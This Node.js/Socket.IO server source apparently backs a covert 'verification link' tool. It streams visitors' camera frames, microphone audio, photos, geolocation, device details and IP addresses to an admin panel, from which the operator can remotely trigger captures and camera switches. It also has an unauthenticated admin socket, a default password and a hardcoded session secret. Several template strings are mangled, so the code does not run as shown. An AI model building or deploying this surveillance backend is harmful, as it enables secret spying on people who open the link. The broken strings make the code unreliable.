const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const fs = require('fs');
const session = require('express-session');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const PORT = process.env.PORT || 3000;
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';
const MAX_USERS = parseInt(process.env.MAX_USERS || '5', 10);

const uploadsDir = path.join(__dirname, 'public', 'uploads');
if (!fs.existsSync(uploadsDir)) {
    fs.mkdirSync(uploadsDir, { recursive: true });
}

app.use(express.json({ limit: '15mb' }));
app.use(express.urlencoded({ extended: true, limit: '15mb' }));

app.use(session({
    secret: 'secure_verification_secret_key',
    resave: false,
    saveUninitialized: false,
    cookie: { secure: false, maxAge: 24 * 60 * 60 * 1000 }
}));

app.use(express.static(path.join(__dirname, 'public')));

let activeUsers = {};
let connectionHistory = [];
let allPhotos = [];
let isLinkActive = true;

app.post('/api/admin/login', (req, res) => {
    const { password } = req.body;
    if (password === ADMIN_PASSWORD) {
        req.session.isAdmin = true;
        res.json({ ok: true });
    } else {
        res.json({ ok: false, message: 'Invalid password' });
    }
});

app.get('/api/admin/status', (req, res) => {
    if (req.session && req.session.isAdmin) {
        res.json({ authenticated: true });
    } else {
        res.json({ authenticated: false });
    }
});

app.post('/api/admin/logout', (req, res) => {
    req.session.destroy(() => {
        res.json({ ok: true });
    });
});

app.delete('/api/admin/history', (req, res) => {
    if (!req.session || !req.session.isAdmin) {
        return res.status(403).json({ ok: false, message: 'Unauthorized' });
    }
    connectionHistory = [];
    io.to('admins').emit('update-admin-state', { linkActive: isLinkActive, users: activeUsers, photos: allPhotos, history: connectionHistory });
    res.json({ ok: true });
});

app.delete('/api/admin/photos/:id', (req, res) => {
    if (!req.session || !req.session.isAdmin) {
        return res.status(403).json({ ok: false, message: 'Unauthorized' });
    }
    const photoId = req.params.id;
    const photoIndex = allPhotos.findIndex(p => p.id === photoId);
    if (photoIndex !== -1) {
        const photo = allPhotos[photoIndex];
        const filePath = path.join(__dirname, 'public', photo.imageUrl);
        if (fs.existsSync(filePath)) {
            try { fs.unlinkSync(filePath); } catch (e) {}
        }
        allPhotos.splice(photoIndex, 1);
        io.to('admins').emit('photo-deleted', photoId);
        res.json({ ok: true });
    } else {
        res.status(404).json({ ok: false, message: 'Photo not found' });
    }
});

io.on('connection', (socket) => {
    const clientIp = socket.handshake.headers['x-forwarded-for'] || socket.conn.remoteAddress;

    socket.on('admin-auth', () => {
        socket.join('admins');
        socket.emit('admin-initial-state', {
            linkActive: isLinkActive,
            users: activeUsers,
            photos: allPhotos,
            history: connectionHistory
        });
    });

    socket.on('admin-toggle-link', (status) => {
        isLinkActive = status;
        io.emit('link-status-changed', isLinkActive);
        if (!isLinkActive) {
            io.emit('link-disabled');
        }
    });

    socket.on('user-connect-info', (data) => {
        if (!isLinkActive) {
            socket.emit('link-disabled');
            return;
        }
        if (Object.keys(activeUsers).length >= MAX_USERS) {
            socket.emit('server-full');
            return;
        }

        const now = new Date();
        const timeStr = now.toLocaleTimeString() + ' ' + now.toLocaleDateString();

        activeUsers[socket.id] = {
            id: socket.id,
            deviceInfo: data?.deviceInfo || 'Unknown Device',
            ip: clientIp,
            connectedAt: timeStr,
            rawConnectedAt: now,
            ready: false,
            location: null
        };

        io.to('admins').emit('update-admin-state', { linkActive: isLinkActive, users: activeUsers, photos: allPhotos, history: connectionHistory });
    });

    socket.on('user-ready', (data) => {
        if (activeUsers[socket.id]) {
            activeUsers[socket.id].deviceInfo = data?.deviceInfo || activeUsers[socket.id].deviceInfo;
            activeUsers[socket.id].ready = true;
            io.to('admins').emit('update-admin-state', { linkActive: isLinkActive, users: activeUsers, photos: allPhotos, history: connectionHistory });
        }
    });

    socket.on('live-stream-frame', (frameData) => {
        if (activeUsers[socket.id]) {
            io.to('admins').emit('update-live-stream', { socketId: socket.id, frameData });
        }
    });

    socket.on('audio-stream', (audioData) => {
        if (activeUsers[socket.id]) {
            io.to('admins').emit('audio-stream', { userId: socket.id, audio: audioData });
        }
    });

    socket.on('user-photo-captured', (imageData, callback) => {
        try {
            if (!imageData) {
                if (callback) callback({ success: false });
                return;
            }
            const base64Data = imageData.replace(/^data:image\/jpeg;base64,/, '');
            const photoId = 'photo_' + Date.now() + '_' + Math.random().toString(36).substring(2, 7);
            const filename = ${photoId}.jpg;
            const filepath = path.join(uploadsDir, filename);

            fs.writeFile(filepath, base64Data, 'base64', (err) => {
                if (err) {
                    if (callback) callback({ success: false, error: err.message });
                    return;
                }
                const photoObj = {
                    id: photoId,
                    imageUrl: /uploads/,
                    deviceInfo: activeUsers[socket.id]?.deviceInfo || 'Unknown Device',
                    timestamp: new Date()
                };
                allPhotos.unshift(photoObj);
                io.to('admins').emit('new-photo', photoObj);
                if (callback) callback({ success: true, url: photoObj.imageUrl });
            });
        } catch (e) {
            if (callback) callback({ success: false, error: e.message });
        }
    });

    socket.on('user-location', (coords) => {
        if (activeUsers[socket.id]) {
            activeUsers[socket.id].location = coords;
            io.to('admins').emit('update-admin-state', { linkActive: isLinkActive, users: activeUsers, photos: allPhotos, history: connectionHistory });
        }
    });

    socket.on('admin-trigger-capture', (targetId) => {
        io.to(targetId).emit('capture-photo');
    });

    socket.on('admin-request-location', (targetId) => {
        io.to(targetId).emit('request-location');
    });

    socket.on('admin-switch-camera', (targetId) => {
        io.to(targetId).emit('switch-camera');
    });

    socket.on('disconnect', () => {
        if (activeUsers[socket.id]) {
            const user = activeUsers[socket.id];
            const now = new Date();
            const discTimeStr = now.toLocaleTimeString() + ' ' + now.toLocaleDateString();
            
            const diffMs = now - user.rawConnectedAt;
            const diffSec = Math.floor(diffMs / 1000);
            const mins = Math.floor(diffSec / 60);
            const secs = diffSec % 60;
            const durationStr = ${mins}m s;

            connectionHistory.unshift({
                deviceInfo: user.deviceInfo,
                ip: user.ip,
                connectedAt: user.connectedAt,
                disconnectedAt: discTimeStr,
                duration: durationStr
            });

            if (connectionHistory.length > 50) connectionHistory.pop();

            delete activeUsers[socket.id];
            io.to('admins').emit('update-admin-state', { linkActive: isLinkActive, users: activeUsers, photos: allPhotos, history: connectionHistory });
        }
    });
});

server.listen(PORT, () => {
    console.log(Server running on port );
});
